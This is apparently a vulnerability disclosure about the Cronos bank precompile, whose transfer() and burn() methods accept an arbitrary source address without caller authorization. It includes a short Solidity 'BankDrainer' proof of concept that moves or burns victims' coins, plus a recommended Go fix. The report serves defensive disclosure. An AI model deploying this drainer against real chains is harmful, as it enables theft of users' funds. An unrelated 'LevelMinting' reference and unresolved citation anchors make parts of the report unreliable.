### Title
Bank Precompile `transfer()` and `burn()` Accept Arbitrary `sender`/`addr` Without Caller Authorization — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary

The bank precompile's `transfer(address sender, address recipient, uint256 amount)` and `burn(address addr, uint256 amount)` methods accept the source address as a caller-supplied argument with no check that it equals `contract.Caller()`. Any EVM contract can therefore drain or destroy native bank coins (`evm/<callerContractAddress>` denom) from an arbitrary victim address without that address's consent.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles three mutating methods. For `TransferMethodName`: [1](#0-0) 

`sender` is taken verbatim from `args[0]` — a caller-controlled value — and used directly as the `from` address in `bankKeeper.SendCoins`. There is no assertion that `sender == contract.Caller()`.

For `BurnMethodName`: [2](#0-1) 

`recipient` (the address whose coins are burned) is again taken from `args[0]` with no check against `contract.Caller()`. `bankKeeper.SendCoinsFromAccountToModule(ctx, addr, ...)` then pulls coins out of the victim's account.

The denom is always derived from the calling contract: [3](#0-2) [4](#0-3) 

So the denom is `evm/0x<callerContractAddress>`. Any user who holds native bank coins of that denom is at risk.

The only guard present is a blocked-address check on the *recipient* for `transfer`, which does not protect the *sender*: [5](#0-4) 

### Impact Explanation

Users who convert CRC20/CRC21 tokens to native Cosmos bank coins (via `ConvertCoinFromNativeToCRC21` or the reverse path) hold `evm/0x<contractAddress>` coins in their bank accounts. A malicious or compromised CRC20 contract at `0xToken` can call:

```
bankPrecompile.transfer(victimAddress, attackerAddress, victimBalance)
```

and unconditionally move all of the victim's `evm/0xToken` native bank coins to the attacker — no approval, no signature from the victim. Similarly, `burn(victimAddress, amount)` destroys those coins outright.

This is an **unauthorized transfer/burn of CRC20-backed native bank assets**, matching the Critical impact tier.

### Likelihood Explanation

- The entry path is fully unprivileged: any deployed EVM contract can call the bank precompile.
- The denom scope limits the attack to holders of `evm/<callerContract>` coins, but this is exactly the population of users who have used the CRC20↔native conversion flow — a core Cronos feature.
- A malicious token issuer, a compromised contract, or a reentrancy/delegatecall path in any mapped CRC20 contract is sufficient to trigger the exploit.

### Recommendation

In both `TransferMethodName` and `BurnMethodName` handlers, assert that the source address equals the immediate EVM caller before executing the bank operation:

```go
// TransferMethodName
if sender != contract.Caller() {
    return nil, errors.New("sender must be caller")
}

// BurnMethodName
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be caller")
}
```

This mirrors the fix applied in LevelMinting: enforce that `order.benefactor == msg.sender`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
    function burn(address addr, uint256 amount) external payable returns (bool);
}

contract BankDrainer {
    // Cronos bank precompile address
    IBankPrecompile constant bank = IBankPrecompile(address(0x64));

    // Step 1: victim already holds evm/0x<address(this)> native bank coins
    //         (e.g., obtained via the CRC20→native conversion flow)

    // Step 2: attacker calls drain() — no victim interaction required
    function drain(address victim, address attacker, uint256 amount) external {
        // Transfers victim's evm/0x<address(this)> coins to attacker
        // with NO check that victim == msg.sender
        bank.transfer(victim, attacker, amount);
    }

    // Alternatively, destroy victim's coins
    function destroyVictimCoins(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

The attacker deploys `BankDrainer`, calls `drain(victimAddress, attackerAddress, victimBalance)`. The bank precompile executes `bankKeeper.SendCoins(ctx, victimAddr, attackerAddr, coins)` with no authorization from `victimAddress`. [6](#0-5)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L121-148)
```go
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
